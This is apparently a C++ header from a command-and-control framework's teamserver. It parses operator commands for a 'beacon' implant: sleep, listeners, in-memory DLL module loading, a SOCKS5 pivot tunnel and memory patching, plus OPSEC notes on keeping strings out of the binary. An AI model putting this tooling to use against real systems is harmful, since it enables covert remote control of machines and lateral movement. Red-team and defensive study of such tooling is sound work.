#pragma once

#include <string>
#include <vector>
#include <random>

#include "ModuleCmd.hpp"

// TODO replace by number to avoid string in the binary
const std::string HelpCmd = "help";
const std::string SleepCmd = "sleep";
const std::string EndCmd = "end";
const std::string ListenerCmd = "listener";
const std::string ListenerPollCmd = "listenerPoll";
const std::string LoadC2ModuleCmd = "loadModule";
const std::string UnloadC2ModuleCmd = "unloadModule";
const std::string Socks5Cmd = "socks";
const std::string GetInfoCmd = "getInfo";
const std::string PatchMemoryCmd = "patchMemory";

const std::string StartCmd = "start";
const std::string StopCmd = "stop";

const std::string CmdStatusSuccess = "Success";
const std::string CmdStatusFail = "Fail";


class CommonCommands
{
	public:
	CommonCommands()
	{
		m_commonCommands.push_back(SleepCmd);
		m_commonCommands.push_back(EndCmd);
		m_commonCommands.push_back(ListenerCmd);
		m_commonCommands.push_back(LoadC2ModuleCmd);
		m_commonCommands.push_back(UnloadC2ModuleCmd);
		m_commonCommands.push_back(Socks5Cmd);
		m_commonCommands.push_back(GetInfoCmd);
		m_commonCommands.push_back(PatchMemoryCmd);
	}

	int getNumberOfCommand()
	{
		return m_commonCommands.size();
	}

	std::string getCommand(int idx)
	{
		if(idx<m_commonCommands.size())
			return m_commonCommands[idx];
		else 
			return "";
	}

	std::string getHelp(std::string cmd)
	{
		// OPSEC remove getHelp and getInfo strings from the beacon compilation
		std::string output;
#ifdef BUILD_TEAMSERVER
		if(cmd==SleepCmd)
		{
			output = "sleep: \n";
			output += "Set the sleep time in sec for the beacon.\n";
			output += "exemple:\n";
			output += " - sleep 1\n";
		}
		else if(cmd==EndCmd)
		{
			output = "end: \n";
			output += "Stop the beacon.\n";
			output += "exemple:\n";
			output += " - end\n";
		}
		else if(cmd==ListenerCmd)
		{
			output = "listener: \n";
			output += "Start a tcp or smb listener on the beacon.\n";
			output += "exemple:\n";
			output += " - listener start tcp 0.0.0.0 4444\n";
			output += " - listener start smb pipename\n";
			output += " - listener stop uAgXVQny0o1GVoIHf0Jaed4xl5lYpHKU\n";
		}
		else if(cmd==LoadC2ModuleCmd)
		{
			output = "loadModule: \n";
			output += "Load module DLL file on the memory of the beacon, giving the beacon this capability.\n";
			output += "Load the DLL from the given path, if it's not found try the default ../Modules/ path.";
			output += "exemple:\n";
			output += " - loadModule /tools/PrintWorkingDirectory.dll \n";
		}
		else if(cmd==UnloadC2ModuleCmd)
		{
			output = "unloadModule: \n";
			output += "Unload module DLL loaded by loadModule.\n";
			output += "exemple:\n";
			output += " - unloadModule assemblyExec \n";
		}
		else if(cmd==Socks5Cmd)
		{
			output = "socks: \n";
			output += "Start a socks5 server on the TeamServer and tunnel the traffic to the Beacon.\n";
			output += "The tunneling is done using the communication protocol of the beacon.\n";
			output += "Only one socks5 server can be opened at a time.\n";
			output += "exemple:\n";
			output += " - socks start 1080 \n";
			output += " - socks stop \n";
		}
		else if(cmd==GetInfoCmd)
		{
			output = "getInfo: \n";
			output += "TODO\n";
		}
		else if(cmd==PatchMemoryCmd)
		{
			output = "patchMemory: \n";
			output += "TODO\n";
		}
#endif
		return output;
	}

	// if an error ocurre:
	// set_returnvalue(errorMsg) && return -1
	int init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
	{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
		std::string instruction = splitedCmd[0];

		//
		// Sleep
		//
		if(instruction==SleepCmd)
		{
			if(splitedCmd.size()==2)
			{
				float sleepTimeSec=5;
				try 
				{
					sleepTimeSec = atof(splitedCmd[1].c_str());
				}
				catch (const std::invalid_argument& ia) 
				{
					std::cerr << "Invalid argument: " << ia.what() << '\n';
					return -1;
				}
				c2Message.set_instruction(instruction);
				c2Message.set_cmd(std::to_string(sleepTimeSec));	
			}
			else
			{
				std::string errorMsg = getHelp(instruction);
				c2Message.set_returnvalue(errorMsg);
				return -1;
			}
		}
		//
		// End
		//
		else if(instruction==EndCmd)
		{
			c2Message.set_instruction(instruction);
			c2Message.set_cmd("");	
		}
		//
		// Listener
		//
		else if(instruction==ListenerCmd)
		{
			if(splitedCmd.size()>=3)
			{
				if(splitedCmd[1]==StartCmd && splitedCmd[2]=="tcp")
				{
					if(splitedCmd.size()>=5)
					{
						std::string host = splitedCmd[3];
						int port=-1;
						try 
						{
							port = std::atoi(splitedCmd[4].c_str());
						}
						catch (const std::invalid_argument& ia) 
						{
							std::cerr << "Invalid argument: " << ia.what() << '\n';
							return -1;
						}

						std::string cmd = splitedCmd[1];
						cmd+=" ";
						cmd+="tcp";
						cmd+=" ";
						cmd+=host;
						cmd+=" ";
						cmd+=std::to_string(port);
						c2Message.set_instruction(instruction);
						c2Message.set_cmd(cmd);	
					}
					else
					{
						std::string errorMsg = "listener start: not enough arguments";
						c2Message.set_returnvalue(errorMsg);	
						return -1;
					}
				}
				else if(splitedCmd[1]==StartCmd && splitedCmd[2]=="smb")
				{
					if(splitedCmd.size()>=4)
					{
						std::string pipeName = splitedCmd[3];
						std::string cmd = splitedCmd[1];
						cmd+=" ";
						cmd+="smb";
						cmd+=" ";
						cmd+=pipeName;
						c2Message.set_instruction(instruction);
						c2Message.set_cmd(cmd);	
					}
					else
					{
						std::string errorMsg = "listener start: not enough arguments";
						c2Message.set_returnvalue(errorMsg);	
						return -1;
					}
				}
				else if(splitedCmd[1]==StopCmd)
				{
					std::string hash = splitedCmd[2];
					std::string cmd = splitedCmd[1];
					cmd+=" ";
					cmd+=hash;
					c2Message.set_instruction(instruction);
					c2Message.set_cmd(cmd);	
				}				
			}
			else
			{
				std::string errorMsg = getHelp(instruction);
				c2Message.set_returnvalue(errorMsg);
				return -1;
			}
		}
		//
		// Load Memory Module
		//
		else if(instruction==LoadC2ModuleCmd)
		{
			if (splitedCmd.size() == 2)
			{
				std::string inputFile = splitedCmd[1];
				
				std::ifstream input;
				input.open(inputFile, std::ios::binary);
				if(!input)
				{
					std::string newInputFile = m_linuxModulesDirectoryPath;
					newInputFile+=inputFile;
					input.open(newInputFile, std::ios::binary);
				}
				if(!input)
				{
					std::string newInputFile = m_windowsModulesDirectoryPath;
					newInputFile+=inputFile;
					input.open(newInputFile, std::ios::binary);
				}

				if( input ) 
				{
					std::string buffer(std::istreambuf_iterator<char>(input), {});

					c2Message.set_instruction(splitedCmd[0]);
					c2Message.set_inputfile(inputFile);
					c2Message.set_data(buffer.data(), buffer.size());
				}
				else
				{
					c2Message.set_returnvalue("Failed: Couldn't open file.");
					return -1;
				}
			}
			else
			{
				std::string errorMsg = getHelp(instruction);
				c2Message.set_returnvalue(errorMsg);
				return -1;
			}
		}
		else if(instruction==UnloadC2ModuleCmd)
		{
			if (splitedCmd.size() == 2)
			{
				std::string moduleName = splitedCmd[1];

				c2Message.set_instruction(splitedCmd[0]);
				c2Message.set_cmd(moduleName);
			}
			else
			{
				std::string errorMsg = getHelp(instruction);
				c2Message.set_returnvalue(errorMsg);
				return -1;
			}
		}
		//
		// Socks5
		//
		else if(instruction==Socks5Cmd)
		{
			if(splitedCmd.size()>=2)
			{
				if(splitedCmd[1]==StartCmd)
				{
					if(splitedCmd.size()>=3)
					{
						int port=-1;
						try 
						{
							port = std::atoi(splitedCmd[2].c_str());
						}
						catch (const std::invalid_argument& ia) 
						{
							std::cerr << "Invalid argument: " << ia.what() << '\n';
							return -1;
						}

						c2Message.set_instruction(instruction);
						c2Message.set_data(splitedCmd[2].data(), splitedCmd[2].size());	
						c2Message.set_cmd(splitedCmd[1]);	
					}
					else
					{
						std::string errorMsg = "socks start: not enough arguments";
						c2Message.set_returnvalue(errorMsg);	
						return -1;
					}
				}
				else if(splitedCmd[1]==StopCmd)
				{
					c2Message.set_instruction(instruction);
					c2Message.set_cmd("stopSocks");	
				}		
				else
				{
					std::string errorMsg = getHelp(instruction);
					c2Message.set_returnvalue(errorMsg);
					return -1;
				}

			}
			else
			{
				std::string errorMsg = getHelp(instruction);
				c2Message.set_returnvalue(errorMsg);
				return -1;
			}
		}

#endif
		return 0;
	}

	int setDirectories( const std::string& teamServerModulesDirectoryPath,
						const std::string& linuxModulesDirectoryPath,
						const std::string& windowsModulesDirectoryPath,
						const std::string& linuxBeaconsDirectoryPath,
						const std::string& windowsBeaconsDirectoryPath,
						const std::string& toolsDirectoryPath,
						const std::string& scriptsDirectoryPath)
	{
		m_teamServerModulesDirectoryPath=teamServerModulesDirectoryPath;
		m_linuxModulesDirectoryPath=linuxModulesDirectoryPath;
		m_windowsModulesDirectoryPath=windowsModulesDirectoryPath;
		m_linuxBeaconsDirectoryPath=linuxBeaconsDirectoryPath;
		m_windowsBeaconsDirectoryPath=windowsBeaconsDirectoryPath;
		m_toolsDirectoryPath=toolsDirectoryPath;
		m_scriptsDirectoryPath=scriptsDirectoryPath;

		return 0;
	};

private:
	std::vector<std::string> m_commonCommands;

	std::string m_teamServerModulesDirectoryPath;
    std::string m_linuxModulesDirectoryPath;
    std::string m_windowsModulesDirectoryPath;
    std::string m_linuxBeaconsDirectoryPath;
    std::string m_windowsBeaconsDirectoryPath;
    std::string m_toolsDirectoryPath;
    std::string m_scriptsDirectoryPath;
};




